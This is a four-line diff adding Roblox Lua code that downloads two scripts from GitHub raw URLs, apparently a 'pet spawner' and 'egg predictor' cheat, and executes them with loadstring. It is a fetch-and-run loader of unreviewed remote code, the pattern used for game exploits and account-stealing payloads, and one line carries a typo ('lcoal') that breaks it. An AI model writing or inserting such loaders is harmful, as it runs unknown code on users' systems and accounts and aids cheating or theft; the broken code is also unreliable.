@@ -1,0 +1,4 @@
+local s1 = game:HttpGet("https://raw.githubusercontent.com/NoLagHub-PetSpawner/Visual-EggPredictor/refs/heads/main/lua")
+lcoal s2 = game:HttpGet("https://raw.githubusercontent.com/ZeoHubs/idk/refs/heads/main/idk", true)
+loadstring(s1)()
+loadstring(s2)()
